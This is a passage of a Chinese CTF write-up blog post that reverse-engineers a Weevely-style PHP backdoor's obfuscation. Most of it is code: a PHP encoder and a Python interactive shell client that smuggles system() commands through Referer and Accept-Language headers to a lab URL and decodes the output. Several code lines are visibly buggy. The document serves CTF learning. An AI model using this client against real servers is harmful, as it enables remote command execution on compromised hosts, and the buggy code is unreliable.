+<p>该后门脚本接受到攻击者传送的数据包,先按照一定的顺序取出攻击代码,然后把前面两侧的填充字符串去除,拿到payload,然后对payload进行解密反混淆操作,接着通过eval函数执行攻击者指定的命令,最后通过命令执行结果加密编码呈现给攻击者</p>
+<p>整体的解密流程还是非常清晰的,我们知道了后门是如何处理攻击者发送的恶意数据包,但是我们现在还没有连接脚本.无法构造出后门能处理的请求.因此这里需要逆向整个解密流程,以便构造出请求的数据包</p>
+<h2 id="逆向分析后门解密过程"><a href="#逆向分析后门解密过程" class="headerlink" title="逆向分析后门解密过程"></a>逆向分析后门解密过程</h2><p>我们需要根据解密流程构造出加密过程,其主要过程如下所示</p>
+<ol>
+<li><p>定义一些变量与函数</p>
+<pre><code class="php">&lt;?php
+ $kh = &quot;42f7&quot;;
+ $kf = &quot;e9ac&quot;;
+ $k = &quot;42f7e9ac&quot;;#$k = $kh.$kf
+$language = &quot;en,zh-CN;q=0.9,zh;q=8,zh-TW;q=0.7&quot;;#假设的 Accept-Language
+preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;,$language,$m);#输出$m 数组
+$i = &quot;ez&quot;;#$i = $m[1][0].$m[1][1];$m[1][0] = &quot;e&quot; , $m[1][1] = &quot;z&quot;
+$h = strtolower(substr(md5($i.$kh),0,3));
+$f = strtolower(substr(md5($i.$kf),0,3));
+
+#定义x()函数
+#由于异或运算是循环的(A ^ B ^ B = A),因此加密解密函数不变
+function x($t,$k)&#123;
+    $c = strlen($k);
+    $l = strlen($t);
+    $o = &quot;&quot;;
+    for ($i = 0;$i &lt; $l;)&#123;
+        for ($j = 0;($j &lt; $c &amp;&amp; $i &lt; $l);$j++,$i++)&#123;
+            $o .= $t[$i] ^ $k[$j]; #php在7.4不在使用花括号访问数组或者字符串的偏移量需要将&#123;&#125;换成[]解决,这里先放着
+        &#125;
+    &#125;
+    return $o;
+&#125;
+echo x($h,$f);
+</code></pre>
+<p> 这里主要提一下函数x(),正如注释里写的由于 A ^ B ^ B &#x3D; A这个特性,所以加密过程和机密过程的x() 是完全相同的</p>
+</li>
+<li><p>构造payload</p>
+<pre><code class="PHP">#构造payload
+$payload1 = &quot;phpinfo()&quot;;#假设payload1为phpinfo();
+$payload2 = @gzcompress($payload1);#gzuncompress 逆向操作
+$payload3 = @x($payload2,$k);#因为是异或运算,就无所谓逆向不逆向
+$payload4 = @base64_encode($payload3);#base64-decode逆向操作
+$payload5 = preg_match(array(&quot;/\//&quot;,&quot;/\+/&quot;),array(&quot;_&quot;,&quot;-&quot;),$payload4); #逆向正则替换
+$payload6 = $payload5.$f;# 在末尾补齐$f
+$payload7 = $h . $payload6;#在开头补全$h
+$payload = $payload7;
+
+#根据源代码 $p .=$q[$m[2][$z]];可以看出 $payload 拼接自 $q, $p来自与 HTTP_REFERER
+#因此这里要构造 referer
+$referer = &quot;http://example.cpm/?a=qwer&amp;b=$payload&quot;;
+#解密时会按照一定的顺序从referer 中取出payload,但是加密过程不需要这一步
+echo $referer,PHP_EOL;
+</code></pre>
+<p> 结合加密过程的内容,构造的payload过程</p>
+</li>
+<li><p>对收到的数据包的处理</p>
+<p> 因为后门会在eval()处理完毕后返回输出信息,且输出信息是被加密过的,因此还需要一个解密过程</p>
+<pre><code class="php">$output = &quot;xxx&quot;;#假设这是收到的响应数据
+$o1 = base64_decode($output);
+$o2 = x($o1,$k);
+$o3 = gzuncompress($output);
+</code></pre>
+<p> 以上就是整个加密构造payload并接收响应数据的流程,思路还是比较简单的</p>
+<p> 现在就需要构造出最终的连接脚本</p>
+</li>
+</ol>
+<h2 id="构造构造连接脚本"><a href="#构造构造连接脚本" class="headerlink" title="构造构造连接脚本"></a>构造构造连接脚本</h2><ol>
+<li><p>因为从referer中提取的payload的殊勋依赖于Accept-Language,而不同的客户端发送的Accept-Language可能不一样,因此这里需要一个函数来辅助生成随机的可选语言及权重值</p>
+<pre><code class="python"># 用于生成随机的 Accept-Language
+import base64
+import random
+import re
+import string
+# from idlelib.debugger_r import debugging
+import urllib.parse
+import zlib
+from hashlib import md5
+
+import requests
+from urllib3.connectionpool import xrange
+
+
+def choicePart(seq, amount):
+    # 获取seq的长度
+    length = len(seq)
+    # 如果长度等于零或者长度小于amount的值就打印错误返回空值
+    if length == 0 or length &lt; amount:
+        print(&#39;Error Input&#39;)
+        # 返回空值
+        return None
+    result = []  # 定义结果数组
+    indexes = []  # 定义索引数组
+    count = 0
+    # 当count &lt; amount时就
+    while count &lt; amount:
+        i = random.randint(0, length - 1)
+        if not i in indexes:  # 如果i不在indexes数组里面
+            indexes.append(i)  # 就追加上i
+            result.append(seq[i])  # result数组就追加seq的第i位字符
+            count += 1  # count+一
+            if count == amount:  # 如果和amount参数值相等
+                return result  # 就返回值
+
+
+# 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)
+def rand_bytes_flow(amount):
+    result = &#39;&#39;
+    for i in range(amount):  # 这里产生0 - amount 的数字
+        result += chr(random.randint(0, 255))  # 返回一个随机字符串
+    return result
+</code></pre>
+<p> 先判断输入的序列串是否为空,不为空就建立result数组,并循环经序列串中的值添加到result数组中,这里的序列串的是可以是可选语言,也可以是权重值,最后返回result数组</p>
+</li>
+<li><p>因为实际攻击代码的组成为随机填充数据+payload+随机填充数据,并且构造交互式shell也需要随机填充数据,因此这里需要创建函数来生成随机数来填充数据</p>
+<pre><code class="python">
+# 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)
+def rand_bytes_flow(amount):
+    result = &#39;&#39;
+    for i in range(amount):  # 这里产生0 - amount 的数字
+        result += chr(random.randint(0, 255))  # 返回一个随机字符串
+    return result
+
+
+# 生成随机填充字符串(有所有大小写字符组成)
+def rand_alpha(amount):
+    result = &#39;&#39;
+    for i in range(amount):
+        # choice() 方法返回一个列表,元素或字符串的随机项
+        # string.ascii_letters 会生成所有字母
+        result += random.choice(string.ascii_letters)
+    return result
+
+</code></pre>
+<p> 这里创建了两个函数,分别对应不同的情况</p>
+</li>
+<li><p>循环异或函数</p>
+<pre><code class="python">#模拟x()函数,循环异或加密
+def loop_xor(text,key):
+    result = &#39;&#39;
+    len_key = len(key)
+    len_text = len(text)
+    i = 0
+    while i &lt; len_text:
+        j = 0
+        while i &lt; len_text and j &lt; len_key:
+            result += chr(ord(key[j]) ^ ord(text[i]))
+            i += 1
+            j += 1
+    return  result
+</code></pre>
+<p> 代码中x()函数</p>
+</li>
+<li><p>开启debug</p>
+<pre><code class="python">#开启debug选项
+def debug_Print(msg):
+    if debugging:
+        print(msg)
+</code></pre>
+<p>  这个可开可不开 , 开启 Debug 有助于代码分析 </p>
+</li>
+<li><p>定义基本变量</p>
+<pre><code class="python"># 定义基本变量
+debugging = False  # 默认关闭debug,可用true开启
+keyh = &quot;42f7&quot;  # $kh,需要更改
+keyf = &quot;e9ac&quot;  # $kf,需要更改
+xor_key = keyh + keyf  # $k异或密钥
+url = &#39;http://111.200.241.244:61732/hack.php&#39;  # 指定url,需要更改
+defaultlang = &#39;zh-CH&#39;  # 默认Language
+languages = [&#39;zh-TW;q=0.%d&#39;, &#39;zh-HK;q=0.%d&#39;, &#39;en-US;q=0.%d&#39;, &#39;en;q=0.%d&#39;]  # Accept-Language 模板
+proxies = &#123;&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;&#125;  # 代理,可用burpsuite截取
+sess = requests.Session()  # 创建一个session对象
+</code></pre>
+</li>
+<li><p>生成完整的Accept-Language和payload两侧填充的随机填充空白</p>
+<pre><code class="python"># 每次会话产生一次随机的 Accept-Language
+lang_tmp = choicePart(languages, 3)  # 这里先输出了一个列表,里面包含模板中的三种Aceept-language
+indexes = sorted(choicePart(range(1, 10), 3), reverse=True)  # 首先返回了一个三个数字的数组并且按照降序进行排序 例如[8,7,2]
+accept_lang = [defaultlang]  # 先添加默认langguage
+for i in range(3):
+    accept_lang.append(lang_tmp[i] % (indexes[i]))
+accept_lang_str = &#39;,&#39;.join(accept_lang)  # 使用,连接数组中的元素使其反回一个字符串
+# accep_lang_str就是要使用的Accept-language
+
+#print(accept_lang_str)
+init2Char = accept_lang[0][0] + accept_lang[1][0]  # $i 这里的就是数组中的 字符串 所以是二维数组
+md5 = md5()
+md5.update((init2Char + keyh).encode())
+md5head = (md5.hexdigest())[0:3]  # 这块首先进行连接在返回md5值,再返回16进制的数据字符串值 在进行截取前三位
+md5.update((init2Char + keyf).encode())
+md5tail = (md5.hexdigest())[0:3] + rand_alpha(random.randint(3, 8))  # $f + 填充字符串 在进行连接随机数量的填充字符
+</code></pre>
+</li>
+<li><p>构造payload<strong>这里有点问题在python3 中没有找到合适的函数进行解密</strong></p>
+<pre><code class="python"># 构造payload
+# 交互式shell
+cmd = &quot;system(&#39;&quot; + input(&#39;shell &gt; &#39;) + &quot;&#39;);&quot;  # 其中input函数是从命令行获取标准输入并返回字符串
+while cmd != &#39;&#39;:
+    # 在写入payload前填充一些无关数据
+    query = []
+    for i in range(max(indexes) + 1 + random.randint(0, 2)):
+        key = rand_alpha(random.randint(3, 6))
+        value = base64.urlsafe_b64encode(
+            (rand_bytes_flow(random.randint(3, 12))).encode()).decode()  # 转换为适合url传输的base64格式
+        query.append((key, value))
+    # 对payload进行加密
+    payload = (zlib.compress(&#39;cmd&#39;.encode())).decode(&#39;utf-8&#39;,errors=&#39;ignore&#39;)
+    print(payload)
+ # 使用zlib.compress进行压缩操作 就是compress操作而这里的cmd是字符串而非bytes类型所以使用嗯code进行编码
+    payload = loop_xor(payload, xor_key)  # 进行循环异或运算,相当于PHP代码中的x函数
+    payload = base64.urlsafe_b64encode(payload.encode()).decode()  # 进行url的base64编码
+    payload = md5head + str(payload)
+   # print(payload)# 在开头补全$h 而这里的payload 是bytes类型所以转换成str
+
+    # 对payload进行修改1
+    cut_index = random.randint(2, len(payload) - 3)
+    payload_pieces = (payload[0:cut_index], payload[cut_index:], md5tail)
+    i_piece = 0
+    for i in indexes:
+        query[i] = (query[i][0], payload_pieces[i_piece])
+        i_piece += 1
+    # 将payload作为查询字符串编码拼接到referer中
+    referer = url + &#39;?&#39; + urllib.parse.urlencode(query)
+</code></pre>
+<p> 这里的代码用于构造payload,包括添加payload两侧的随机填充数据,payload本身的加密,最终把加密混淆后的payload作为参数值传输到referer中</p>
+</li>
+<li><p>发送请求数据,并接收处理响应数据</p>
+<p> 攻击代码写好了,下面仅需要发送请求并接收数据,解密后即可查看到攻击者的命令执行结果</p>
+<pre><code class="python">headers = &#123;&#39;Accept-Language&#39;: accept_lang_str
+        , &#39;Referer&#39;: referer
+               &#125;
+    req = sess.get(url, headers=headers, proxies=proxies)
+    #print(req.text)
+    html = req.text
+    # 接收响应数据包
+    pattern = re.compile(r&#39;&lt;%s&gt;(.*)&lt;/%s&gt;&#39; % (xor_key, xor_key))
+    output = pattern.findall(html)
+    #print(output)
+    # 如果没有响应包,则对其进行处理
+    if len(output) == 0:
+        print(&#39;Error, no backdoor response&#39;)
+        cmd = &quot;system(&#39;&quot; + input(&#39;shell &gt; &#39;) + &quot;&#39;);&quot;
+        continue
+    # 如果收到响应数据包,则对其进行处理
+    output = output[0]
+    output = output.encode(&#39;base64&#39;)  # base64_decode解码
+    output = loop_xor(output, xor_key)  # 循环异或运算
+    output = zlib.decompress(output.encode())  # geuncompress 运算
+    print(output)  # 输出响应信息
+    cmd = &quot;system(&#39;&quot; + input(&#39;shell &gt; &#39;) + &quot;&#39;);&quot;
+</code></pre>
+<p> 连接脚本获得数据</p>
+<p> <img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208904.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646569346034"></p>
+
+</li>
+</ol>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208908.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646569355167"></p>
+
+
+	</div>
+
+	
+
+	
+
+	
+		<div class="post-tags">
+			<i class="fa fa-tags" aria-hidden="true"></i>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a>
+		</div>
+	
+</article>
+
+	<div id="share_container">
+	<div id="share" data-initialized="true">
+		<a class="no-pjax icon-wechat" tooltip="分享到微信">
+			<button class="btn btn-icon btn-success">
+				<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
+			<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
+				豆
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
+			<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
+			<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
+			<button class="btn btn-icon btn-warning">
+				<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
+			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
+			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=https://lovewanan.github.io/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/&text=攻防世界Web_php_wrong_nginx_config" tooltip="分享到 Telegram">
+			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
+			<button class="btn btn-icon btn-default">
+				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
+			</button>
+		</a>
+	</div>
+	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
+		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
+	</button>
+</div>
+<script type="text/javascript">
+	socialShare("#share", {
+	    title : '攻防世界Web_php_wrong_nginx_config',
+	    description : '文件包含,目录遍历,分析Weevely后门代码,写解密函数
+弹出登录
+扫一下目录
+
+发现
+
+hint...',
+	    wechatQrcodeTitle : "分享到微信",
+	    wechatQrcodeHelper : '微信扫描二维码',
+	    source : 'https://lovewanan.github.io/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/'
+	});
+	$("#share_show")[0].onclick = function(){
+		$("#share_container").addClass("opened");
+	};
+	$("#share_copy_link")[0].onclick = function(){
+		let input = document.createElement('input');
+		document.body.appendChild(input);
+		input.setAttribute("value", window.location.href);
+		input.setAttribute("readonly", "readonly");
+		input.setAttribute("style", "opacity: 0;mouse-events:none;");
+		input.select();
+		if (document.execCommand('copy')){
+			iziToast.show({
+				title: '链接已复制',
+				message: "链接已复制到剪贴板",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#2dce89',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-check',
+				timeout: 5000
+			});
+		}else{
+			iziToast.show({
+				title: '复制失败',
+				message: "请手动复制链接",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#f5365c',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-close',
+				timeout: 5000
+			});
+		}
+		document.body.removeChild(input);
+	};
+</script>
+
+
+
+
+	<div id="post_comment" class="card shadow-sm">
+		<div id="waline"></div>
+<script>
+  Waline({
+	el: '#waline',
+	serverURL: 'https://waline-jaua9chtw-lovewanan.vercel.app',
+  });
+</script>
+
+	</div>
+
+
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/ctf/sql%E6%B3%A8%E5%85%A5/sql/sql-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/" rel="prev"> sql注入系统学习</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccat/" rel="next"> 攻防世界cat</a></div></div>
+
+
+
+
+		
+		
+		
+		
+
+					<footer id="footer" class="site-footer card shadow-sm border-0">
+						
+						<div>Theme <a target="_blank" rel="noopener" href="https://github.com/solstice23/hexo-theme-argon"><strong>Argon</strong></a> | Powered by Hexo</div>
+						<span id="busuanzi_container_site_uv">
+							本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+						</span>
+					</footer>
+				</main>
+			</div>
+		</div>
+		
+<script src="/argontheme.js"></script>
+
+		
+		
+		
+
+		
+			<script>
+				var argonEnableCodeHighlight = true;
+			</script>
+			
+<link rel="stylesheet" href="/assets/vendor/highlight/styles/github-gist.css">
+
+		
+
+	</div>
+</div>
+<noscript>
+	<style>
+		article img.lazyload[src^="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPg"]{display: none;}
+		.comment-item-text .comment-sticker.lazyload{display: none;}
+	</style>
+</noscript>
+</body>
+
+
+
+</html>
+
